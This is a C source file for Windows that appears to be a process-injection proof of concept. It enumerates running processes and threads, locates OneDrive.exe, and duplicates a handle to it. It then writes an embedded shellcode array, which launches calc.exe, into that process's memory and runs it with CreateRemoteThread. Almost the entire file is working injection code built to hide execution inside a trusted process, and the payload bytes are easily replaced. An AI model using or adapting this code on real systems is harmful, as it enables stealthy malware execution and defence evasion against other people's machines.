#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <winnt.h>

// Define the shellcode to launch calc.exe
const char shellcode[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52
, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48
, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9
, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41
, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48
, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01
, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48
, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0
, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c
, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0
, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04
, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59
, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48
, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00
, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f
, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff
, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb
, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c
, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

// Define the size of the shellcode
const size_t shellcode_size = sizeof(shellcode);

BOOL inject_shellcode(HANDLE new_process_handle, const char *shellcode, size_t shellcode_size)
{
    // Declare the variables for the remote memory address and thread handle
    LPVOID remote_memory_address;
    HANDLE thread_handle;

    // Allocate memory in the remote process with write-only permissions
    remote_memory_address = VirtualAllocEx(new_process_handle, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Get Last Error: %d\n", GetLastError() );

    // Write the shellcode to the memory
    WriteProcessMemory(new_process_handle, remote_memory_address, shellcode, shellcode_size, NULL);
    printf("Get Last Error: %d\n", GetLastError() );

    // Set the memory back to execute permissions
    DWORD old_protect;
    VirtualProtectEx(new_process_handle, remote_memory_address, shellcode_size, PAGE_EXECUTE, &old_protect);
    printf("Get Last Error: %d\n", GetLastError() );


    // Create a thread in the remote process to execute the shellcode
    thread_handle = CreateRemoteThread(new_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_memory_address, NULL, 0, NULL);
    printf("Get Last Error: %d\n", GetLastError() );

    if (thread_handle == NULL)
    {
        // Print an error message if the thread could not be created
        printf("Error: Failed to create remote thread\n");
    }
    

    // Wait for the remote thread to finish executing
    WaitForSingleObject(thread_handle, INFINITE);

    /*
    BOOL result = QueueUserAPC((PAPCFUNC)remote_memory_address, thread_handle, (ULONG_PTR) NULL);
    printf("Get Last Error: %d\n", GetLastError() );

    WaitForSingleObject(thread_handle, INFINITE);*/

    // Clean up the allocated memory and thread handle in the remote process
    VirtualFreeEx(new_process_handle, remote_memory_address, 0, MEM_RELEASE);
    CloseHandle(thread_handle); 

}

int main() 
{

    NTSTATUS NTAPI NtGetNextProcess(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
    );

NTSTATUS NTAPI NtGetNextThread(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
    );

    // Variables to store the process and thread handles
    HANDLE process_handle = NULL, thread_handle = NULL;
    DWORD pid;
    char filename[MAX_PATH];

    //declare an array for holding the pids of processes that pass the duplicate_handle check
    //DWORD pid_array[100];
    //int i = 0;

    // Loop through all processes
    while (NtGetNextProcess(process_handle, MAXIMUM_ALLOWED, 0, 0, &process_handle) == 0)
    {
        // Get the process ID and executable file name
        pid = GetProcessId(process_handle);
        //define buffer to pass to GetModuleFileNameExW
        wchar_t buffer[MAX_PATH];
        //get the filename
        GetModuleFileNameExW(process_handle, NULL, buffer, MAX_PATH);
        //convert the filename to char  
        wcstombs(filename, buffer, MAX_PATH);

        // Print the process ID and executable file name
        printf("\tFile Name: %s\n", filename);
        printf("\tProcess ID: %d\n", pid);
        printf("\tProcess Handle: %#x\n", process_handle);

        //get the thread_handle of the process
        //thread_handle = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

        // Loop through all threads of the current process
        while (NtGetNextThread(process_handle, thread_handle, THREAD_ALL_ACCESS, 0, 0, &thread_handle) == 0)
        {
            // Print the thread handle
            printf("\tThread Handle: %#x\n", thread_handle);
            //check if the process filename ends in OneDrive.exe
            if (strstr(filename, "OneDrive.exe") != NULL)
            {
                printf("OneDrive.exe process found. PID: %d\n", pid);
                int tid = GetThreadId(thread_handle);
                printf("\tThread ID: %d\n", tid);
                //attempt to duplicate the process handle to get a new handle with the PROCESS_VM_OPERATION permission
                HANDLE new_process_handle;
                BOOL duplicate_handle = DuplicateHandle(GetCurrentProcess(), process_handle, GetCurrentProcess(), &new_process_handle, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, 0);
                if (!duplicate_handle)
                {
                    printf("Failed to duplicate handle.\n");
                    continue;
                }
                else
                {
                    printf("Successfully duplicated handle for process pid: %d\n", pid);

                //perform process injection
                BOOL result = inject_shellcode(new_process_handle, shellcode, shellcode_size);
                //check if injection was successful
                if (result == TRUE)
                {
                    printf("Successfully injected shellcode into process pid: %d\n", pid);
                    break;                    
                }
                else
                {
                    printf("Failed to inject shellcode into process pid: %d\n", pid);
                }
                
                break;
            }

        }

    }   

    
}

return 0;

}
